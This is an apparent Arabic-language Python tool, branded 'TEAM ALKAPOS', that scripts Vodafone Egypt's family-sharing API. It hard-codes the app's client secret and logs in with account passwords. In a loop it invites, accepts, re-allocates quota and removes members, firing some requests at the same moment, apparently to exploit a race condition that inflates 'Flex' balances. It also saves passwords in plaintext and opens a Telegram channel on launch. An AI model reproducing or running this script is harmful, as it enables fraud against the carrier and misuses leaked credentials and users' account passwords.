import requests
import time
import json
import os , sys
import random
import re
from threading import Thread
from colorama import init, Fore, Style
from colorama import Fore
import pyfiglet
import webbrowser

G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
B = Fore.BLUE

#@MR_ALKAPOS

s=("□■"*30)
m=("□■"*30)
g=("□■"*30)
SK = pyfiglet.figlet_format('                TEAM')
saa = pyfiglet.figlet_format('       ALKAPOS')
sk2=pyfiglet.figlet_format('        VODAFONE')
alkapos=pyfiglet.figlet_format('          50K_Flex ')
def sped(s):
        for c in s + '\n':
        	sys.stdout.write(c)
        	sys.stdout.flush()
        	time.sleep(0.001)
        	def alkapos():
        		print("")
sped(R+s)
sped(G+SK)
sped(G+saa)
sped(R+m)
sped(Y+sk2)
sped(R+g)
sped(G+alkapos)
sped(R+g)
webbrowser.open("https://t.me/TEAM_ALKAP0S")









# --- تهيئة الألوان ---
init(autoreset=True)
BRIGHT_YELLOW = Style.BRIGHT + Fore.YELLOW
WHITE = Fore.WHITE
CYAN = Fore.CYAN
ERROR_COLOR = Style.BRIGHT + Fore.RED
SUCCESS_COLOR = Style.BRIGHT + Fore.GREEN
RESET = Style.RESET_ALL
SEPARATOR = BRIGHT_YELLOW + "-" * 70 + RESET
BOLD = Style.BRIGHT


CONFIG_FILE = "config.json"
AUTH_URL = 'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token'
FAMILY_API_URL = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
CLIENT_ID = 'my-vodafone-app'
CLIENT_SECRET = 'a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3'

# --- إعدادات ثابتة ---
TASK_ORDER = [2, 3, 5, 4, 1]  # إرسال دعوة, قبول, تغيير 40%, حذف, تغيير 10%
DELAYS = {"2": 10, "3": 310, "5": 0, "4": 10, "1": 310}
SUBDOMAINS_CONFIG = {
    "add_member": "mobile.vodafone.com.eg",
    "quota_40": "web.vodafone.com.eg",
    "remove_member": "mobile.vodafone.com.eg",
    "quota_10": "web.vodafone.com.eg"
}
SYNC_TASKS = [3, 5]  # قبول الدعوة وتغيير 40% متزامن
RETRIES_ACCEPT = 3
RETRIES_ADD_REMOVE = 3
FLEX_CHECK_DELAY = 5  # تأخير 5 ثوانٍ بعد المهام المتزامنة

# --- قائمة وكلاء المستخدم ---
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

# --- جلسة طلبات موحدة ---
session = requests.Session()

# --- الدوال المساعدة ---

def countdown(delay_time):
    """دالة لعرض عداد تنازلي."""
    if delay_time <= 0:
        return
    for i in range(int(delay_time), 0, -1):
        print(f"\r{BRIGHT_YELLOW}⏳ جاري الانتظار لمدة {i} ثانية... {RESET}", end='', flush=True)
        time.sleep(1)
    print("\r" + " " * 50, end='', flush=True)

def get_fresh_token(owner_number, password):
    """الحصول على توكن وصول جديد."""
    url = AUTH_URL
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
        "x-dynatrace": "MT_3_17_998679495_45-0_a556db1b-4506-43f3-854a-1d2527767923_0_18957_273",
        "x-agent-operatingsystem": "1630483957",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "RMX1911",
        "x-agent-version": "2021.12.2",
        "x-agent-build": "911",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "mobile.vodafone.com.eg",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.1"
    }
    data = {
        "username": owner_number,
        "password": password,
        "grant_type": "password",
        "client_secret": CLIENT_SECRET,
        "client_id": CLIENT_ID
    }
    print(f"{CYAN}[*] جاري الحصول على access_token...{RESET}")
    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        response.raise_for_status()
        access_token = response.json().get("access_token")
        if access_token:
            print(f"{SUCCESS_COLOR}[+] تم الحصول على access_token بنجاح!{RESET}")
            return access_token
        else:
            print(f"{ERROR_COLOR}[-] خطأ: لم يتم العثور على access_token.{RESET}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_COLOR}[-] خطأ في الاتصال: {e}{RESET}")
        return None

def check_flex_balance(token, owner_number):
    """التحقق من عدد الفلكسات المتبقية."""
    url = f'https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={owner_number}&@type=aggregated'
    headers = {
        'channel': 'MOBILE',
        'useCase': 'Promo',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'x-agent-operatingsystem': '11',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'OPPO CPH2059',
        'x-agent-version': '2024.3.3',
        'x-agent-build': '593',
        'msisdn': owner_number,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Accept-Language': 'ar',
        'Host': 'web.vodafone.com.eg',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.11.0'
    }
    print(f"{CYAN}[*] جاري التحقق من عدد الفلكسات...{RESET}")
    try:
        response = session.get(url, headers=headers, timeout=20)
        response.raise_for_status()
        pattern = r'"usageType":"limit","bucketBalance":\[\{"remainingValue":\{"amount":(.*?),"units":"FLEX"'
        match = re.search(pattern, response.text)
        if match:
            flex = int(float(match.group(1)))
            if flex == 0:
                print(f"{BRIGHT_YELLOW}📊 القيمة أكبر من 30 ألف فلكس{RESET}")
            else:
                print(f"{SUCCESS_COLOR}📊 عدد الفلكسات الحالية هو: {flex}{RESET}")
        else:
            print(f"{ERROR_COLOR}[-] خطأ: لم يتم العثور على عدد الفلكسات في الاستجابة.{RESET}")
            print(f"{CYAN}📋 استجابة الـ API: {response.text}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_COLOR}[-] خطأ في جلب عدد الفلكسات: {e}{RESET}")
        print(f"{CYAN}📋 استجابة الـ API (إن وجدت): {response.text if 'response' in locals() else 'غير متاحة'}{RESET}")

def create_headers(access_token_val, subdomain, user_agent, owner_number):
    """إنشاء الترويسات."""
    return {
        "Authorization": f"Bearer {access_token_val}",
        "msisdn": owner_number,
        "Accept": "application/json",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": user_agent,
        "Origin": f"https://{subdomain}",
        "Referer": f"https://{subdomain}/spa/familySharing",
        "clientId": "WebsiteConsumer"
    }

# --- دوال الـ API ---

def change_quota(access_token, owner_number, member_number, quota, user_agent, results_dict, result_key, subdomain):
    """تغيير حصة عضو."""
    url = FAMILY_API_URL
    headers = {
        
  'User-Agent': "okhttp/4.11.0",
  'Connection': "Keep-Alive",
  'Accept': "application/json",
  'Accept-Encoding': "gzip",
  'Content-Type': "application/json",
  "Authorization": f"Bearer {access_token}",
  'api-version': "v2",
  'x-agent-operatingsystem': "15",
  'clientId': "AnaVodafoneAndroid",
  'x-agent-device': "HONOR ALI-NX1",
  'x-agent-version': "2024.11.2",
  'x-agent-build': "944",
  'msisdn': owner_number,
  'Accept-Language': "ar",
  'Content-Type': "application/json; charset=UTF-8"
    }
    payload = {
  "category": [
    {
      "listHierarchyId": "TemplateID",
      "value": "47"
    }
  ],
  "createdBy": {
    "value": "MobileApp"
  },
  "parts": {
    "characteristicsValue": {
      "characteristicsValue": [
        {
          "characteristicName": "quotaDist1",
          "type": "percentage",
          "value": quota
        }
      ]
    },
    "member": [
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": owner_number
          }
        ],
        "type": "Owner"
      },
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": member_number
          }
        ],
        "type": "Member"
      }
    ]
  },
  "type": "QuotaRedistribution"
    }
    print(f"{CYAN}  [🚀] إرسال طلب تغيير حصة {BOLD}{member_number}{RESET}{CYAN} إلى {BOLD}{quota}%{RESET}")
    try:
        response = session.patch(url, headers=headers, json=payload, timeout=30)
        results_dict[result_key] = {'status': response.status_code, 'text': response.text}
        status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
        print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
        print(f"{ERROR_COLOR}  [🔥] خطأ اتصال لـ {member_number}: {e}{RESET}")

def add_family_member(access_token, owner_number, member_number, quota_value, user_agent, results_dict, result_key, subdomain, max_retries):
    """إضافة عضو جديد."""
    url = FAMILY_API_URL
    headers = {
        "Host": "mobile.vodafone.com.eg",
        "x-dynatrace":"MT_3_13_2611661057_68-0_a556db1b-4506-43f3-854a-1d2527767923_0_77308_312",
        "msisdn": owner_number,
        "api-version":"v2",
        "x-agent-operatingsystem":"1630483957",
        "clientId":"AnaVodafoneAndroid",
        "Authorization": f"Bearer {access_token}",
        "x-agent-device":"RMX1911",
        "Accept": "application/json",
        "x-agent-version":"2022.2.1.2",
        "x-agent-build":"911",
        "Accept-Language":"ar",
        "Content-Type":"application/json; charset=UTF-8",
        "Connection":"Keep-Alive",
        "Accept-Encoding":"gzip",
        "User-Agent":"okhttp/4.9.1"
    }
    payload = {"category": [{"listHierarchyId": "PackageID", "value": "523"}, {"listHierarchyId": "TemplateID", "value": "47"}, {"listHierarchyId": "TierID", "value": "523"}, {"listHierarchyId": "familybehavior", "value": "percentage"}], "name": "FlexFamily", "parts": {"characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": str(quota_value),}]}, "member": [{"id": [{"schemeName": "MSISDN", "value":owner_number,}], "type": "Owner"}, {"id": [{"schemeName": "MSISDN", "value":member_number}], "type": "Member"}]}, "type": "SendInvitation"}
    for attempt in range(max_retries):
        print(f"{CYAN}  [🚀] إرسال طلب دعوة لـ {BOLD}{member_number}{RESET}{CYAN} بحصة {BOLD}{quota_value}% (محاولة {attempt + 1}/{max_retries}){RESET}")
        try:
            response = session.patch(url, headers=headers, json=payload, timeout=45)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            status_color = SUCCESS_COLOR if response.status_code in [200, 201, 204] else ERROR_COLOR
            print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
            response.raise_for_status()
            print(f"{SUCCESS_COLOR}✅ تم إرسال الطلب بنجاح في المحاولة رقم {attempt + 1}.{RESET}")
            return
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print(f"{ERROR_COLOR}  [🔥] خطأ اتصال لـ {member_number} في المحاولة {attempt + 1}: {e}{RESET}")
        if attempt < max_retries - 1:
            countdown(5)
    print(f"{ERROR_COLOR}❌ فشل إرسال الطلب بعد {max_retries} محاولة.{RESET}")

def accept_invitation_with_retries(owner_number, member_number, member_password, max_retries, user_agent, results_dict, result_key, subdomain):
    """قبول دعوة العضو."""
    url = FAMILY_API_URL
    for attempt in range(max_retries):
        print(f"{CYAN}  [🔄] محاولة قبول الدعوة لـ {BOLD}{member_number}{RESET} (محاولة {attempt + 1}/{max_retries}){RESET}")
        access_token = get_fresh_token(member_number, member_password)
        if not access_token:
            results_dict[result_key] = {'status': 'TOKEN_FAIL', 'text': 'فشل الحصول على التوكن.'}
            continue
        headers = {
            "api_id": "APP",
            "Authorization": f"Bearer {access_token}",
            "api-version": "v2",
            "x-agent-operatingsystem": "15",
            "clientId": "AnaVodafoneAndroid",
            "x-agent-device": "HONOR ALI-NX1",
            "x-agent-version": "2024.11.2",
            "x-agent-build": "944",
            "msisdn": member_number,
            "Accept": "application/json",
            "Accept-Language": "ar",
            "Content-Type": "application/json; charset=UTF-8",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.11.0"
        }
        data = {
            "category": [
                {
                    "listHierarchyId": "TemplateID",
                    "value": "47"
                }
            ],
            "name": "FlexFamily",
            "parts": {
                "member": [
                    {
                        "id": [
                            {
                                "schemeName": "MSISDN",
                                "value": owner_number
                            }
                        ],
                        "type": "Owner"
                    },
                    {
                        "id": [
                            {
                                "schemeName": "MSISDN",
                                "value": member_number
                            }
                        ],
                        "type": "Member"
                    }
                ]
            },
            "type": "AcceptInvitation"
        }
        try:
            response = session.patch(url, headers=headers, json=data, timeout=30)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
            print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
            if response.status_code in [200, 201]:
                print(f"{SUCCESS_COLOR}✅ تم قبول العضو في المحاولة {attempt + 1}.{RESET}")
                return
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print(f"{ERROR_COLOR}  [🔥] خطأ اتصال في المحاولة {attempt + 1}: {e}{RESET}")
        if attempt < max_retries - 1:
            countdown(5)
    print(f"{ERROR_COLOR}❌ فشل قبول العضو {member_number} بعد {max_retries} محاولة.{RESET}")

def remove_flex_family_member(access_token, owner_number, member_number, user_agent, results_dict, result_key, subdomain, max_retries):
    """حذف عضو."""
    url = FAMILY_API_URL
    headers = {
        "x-dynatrace": "MT_3_17_917396936_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_946_333",
        "Authorization": f"Bearer {access_token}", 
        "api-version": "v2",
        "x-agent-operatingsystem": "15",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "HONOR ALI-NX1",
        "x-agent-version": "2024.11.2",
        "x-agent-build": "944",
        "msisdn": owner_number,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }
    payload = {
        "category": [
            {
                "listHierarchyId": "TemplateID",
                "value": "47"
            }
        ],
        "createdBy": {
            "value": "MobileApp"
        },
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "Disconnect", "value": "0"},
                    {"characteristicName": "LastMemberDeletion", "value": "1"}
                ]
            },
            "member": [
                {
                    "id": [
                        {"schemeName": "MSISDN", "value": owner_number}
                    ],
                    "type": "Owner"
                },
                {
                    "id": [
                        {"schemeName": "MSISDN", "value": member_number}
                    ],
                    "type": "Member"
                }
            ]
        },
        "type": "FamilyRemoveMember"
    }
    for attempt in range(max_retries):
        print(f"{CYAN}  [🚀] إرسال طلب حذف لـ {BOLD}{member_number}{RESET} (محاولة {attempt + 1}/{max_retries}){RESET}")
        try:
            response = session.patch(url, headers=headers, json=payload, timeout=30)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
            print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
            response.raise_for_status()
            print(f"{SUCCESS_COLOR}✅ تم حذف العضو بنجاح في المحاولة {attempt + 1}.{RESET}")
            return
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print(f"{ERROR_COLOR}  [🔥] خطأ اتصال لـ {member_number} في المحاولة {attempt + 1}: {e}{RESET}")
        if attempt < max_retries - 1:
            countdown(5)
    print(f"{ERROR_COLOR}❌ فشل حذف العضو بعد {max_retries} محاولة.{RESET}")

# --- جمع الإعدادات من المستخدم ---
def get_user_config():
    """جمع الأرقام وكلمات المرور وعدد التكرارات فقط."""
    print(SEPARATOR)
    owner_number = input(BRIGHT_YELLOW + "👤 أدخل رقم هاتف المالك: " + WHITE)
    owner_password = input(BRIGHT_YELLOW + "🔒 أدخل كلمة مرور المالك: " + WHITE)
    member1_number = input(BRIGHT_YELLOW + "👥 أدخل رقم العضو الأول: " + WHITE)
    member2_number = input(BRIGHT_YELLOW + "👥 أدخل رقم العضو الثاني: " + WHITE)
    member2_password = input(BRIGHT_YELLOW + "🔒 أدخل كلمة مرور العضو الثاني: " + WHITE)
    total_attempts = 0
    while total_attempts <= 0:
        try:
            total_attempts = int(input(BRIGHT_YELLOW + "🔁 أدخل عدد التكرارات: " + WHITE))
            if total_attempts <= 0:
                print(ERROR_COLOR + "   العدد يجب أن يكون أكبر من صفر." + RESET)
        except ValueError:
            print(ERROR_COLOR + "   أدخل رقمًا صحيحًا." + RESET)
    
    config = {
        'owner_number': owner_number,
        'owner_password': owner_password,
        'member1_number': member1_number,
        'member2_number': member2_number,
        'member2_password': member2_password,
        'total_attempts': total_attempts
    }
    
    save_config_input = input(f"{BRIGHT_YELLOW}💾 هل تريد حفظ الإعدادات في {CONFIG_FILE}؟ [Y/N]: {RESET}").upper()
    if save_config_input == 'Y':
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=4)
        print(SUCCESS_COLOR + f"✅ تم حفظ الإعدادات في {CONFIG_FILE}." + RESET)
    
    return config

def load_config():
    """تحميل الإعدادات من ملف."""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
            print(SUCCESS_COLOR + f"✅ تم تحميل الإعدادات من {CONFIG_FILE}." + RESET)
            return config
        except Exception as e:
            print(ERROR_COLOR + f"❌ خطأ في تحميل الإعدادات: {e}" + RESET)
            return None
    return None

# --- البرنامج الرئيسي ---
def main():
    

    config = None
    if os.path.exists(CONFIG_FILE):
        load_choice = input(f"{BRIGHT_YELLOW}❓ تم العثور على إعدادات سابقة. هل تريد تحميلها؟ [Y/N]: {RESET}").upper()
        if load_choice == 'Y':
            config = load_config()
    
    if not config:
        config = get_user_config()
    
    if not config:
        print(ERROR_COLOR + "❌ لم يتم إدخال الإعدادات. تم إنهاء البرنامج." + RESET)
        return
    
    print(SEPARATOR)
    print(SUCCESS_COLOR + "✅ جاري بدء العملية..." + RESET)
    
    for i in range(config['total_attempts']):
        print(SEPARATOR)
        print(f"{CYAN}╔═══════════[ حلقة التكرار رقم: {i + 1} / {config['total_attempts']} ]═══════════════╗{RESET}")
        
        current_token = get_fresh_token(config['owner_number'], config['owner_password'])
        if not current_token:
            print(f"{ERROR_COLOR}❌ فشل الحصول على التوكن. سيتم تخطي هذه الحلقة.{RESET}")
            continue
            
        current_ua = random.choice(USER_AGENTS)
        results = {}
        executed_tasks = set()
        
        def get_task_args(task_id, token, ua, results_dict):
            if task_id == 1:
                return (token, config['owner_number'], config['member1_number'], "10", ua, results_dict, 'task1', SUBDOMAINS_CONFIG['quota_10'])
            elif task_id == 2:
                return (token, config['owner_number'], config['member2_number'], "40", ua, results_dict, 'task2', SUBDOMAINS_CONFIG['add_member'], RETRIES_ADD_REMOVE)
            elif task_id == 3:
                return (config['owner_number'], config['member2_number'], config['member2_password'], RETRIES_ACCEPT, ua, results_dict, 'task3', SUBDOMAINS_CONFIG['quota_40'])
            elif task_id == 4:
                return (token, config['owner_number'], config['member2_number'], ua, results_dict, 'task4', SUBDOMAINS_CONFIG['remove_member'], RETRIES_ADD_REMOVE)
            elif task_id == 5:
                return (token, config['owner_number'], config['member1_number'], "40", ua, results_dict, 'task5', SUBDOMAINS_CONFIG['quota_40'])
            return None

        for task_id in TASK_ORDER:
            if task_id in executed_tasks:
                continue
            tasks_to_execute = [task_id] if task_id not in SYNC_TASKS else [t for t in SYNC_TASKS if t not in executed_tasks]
            if len(tasks_to_execute) > 1:
                print(f"\n{CYAN}---[ تنفيذ متزامن للمهام: {BOLD}{tasks_to_execute}{RESET}{CYAN} ]---{RESET}")
                threads = []
                for sync_task_id in tasks_to_execute:
                    target_func = None
                    if sync_task_id == 1 or sync_task_id == 5:
                        target_func = change_quota
                    elif sync_task_id == 2:
                        target_func = add_family_member
                    elif sync_task_id == 3:
                        target_func = accept_invitation_with_retries
                    elif sync_task_id == 4:
                        target_func = remove_flex_family_member
                    if target_func:
                        task_args = get_task_args(sync_task_id, current_token, current_ua, results)
                        thread = Thread(target=target_func, args=task_args)
                        threads.append(thread)
                        thread.start()
                        executed_tasks.add(sync_task_id)
                for t in threads:
                    t.join()
                countdown(DELAYS[str(tasks_to_execute[0])])
                # التحقق من عدد الفلكسات بعد المهام المتزامنة بتأخير 5 ثوانٍ
                print(f"{CYAN}---[ التحقق من عدد الفلكسات بعد {FLEX_CHECK_DELAY} ثوانٍ ]---{RESET}")
                countdown(FLEX_CHECK_DELAY)
                check_flex_balance(current_token, config['owner_number'])
            else:
                single_task_id = tasks_to_execute[0]
                target_func = None
                if single_task_id == 1 or single_task_id == 5:
                    target_func = change_quota
                elif single_task_id == 2:
                    target_func = add_family_member
                elif single_task_id == 3:
                    target_func = accept_invitation_with_retries
                elif single_task_id == 4:
                    target_func = remove_flex_family_member
                if target_func:
                    task_args = get_task_args(single_task_id, current_token, current_ua, results)
                    print(f"\n{CYAN}---[ تنفيذ المهمة رقم {single_task_id}: {BOLD}{target_func.__name__}{RESET}{CYAN} ]---{RESET}")
                    target_func(*task_args)
                executed_tasks.add(single_task_id)
                countdown(DELAYS[str(single_task_id)])

        print(f"\n{CYAN}╚══════════════════════════════════════════════════════╝{RESET}")
        print(f"{BRIGHT_YELLOW}📊 ملخص الحلقة رقم {i + 1}:{RESET}")
        success_count = sum(1 for res in results.values() if res and res.get('status') in [200, 201, 204])
        fail_count = len(results) - success_count
        print(f"{SUCCESS_COLOR}  ✓ نجاح: {success_count} طلب{RESET}")
        print(f"{ERROR_COLOR}  ✗ فشل: {fail_count} طلب{RESET}")
    
    print(SEPARATOR)
    print(SUCCESS_COLOR + BOLD + "🎉 اكتملت جميع دورات الإرسال بنجاح." + RESET)

if __name__ == "__main__":
    main()
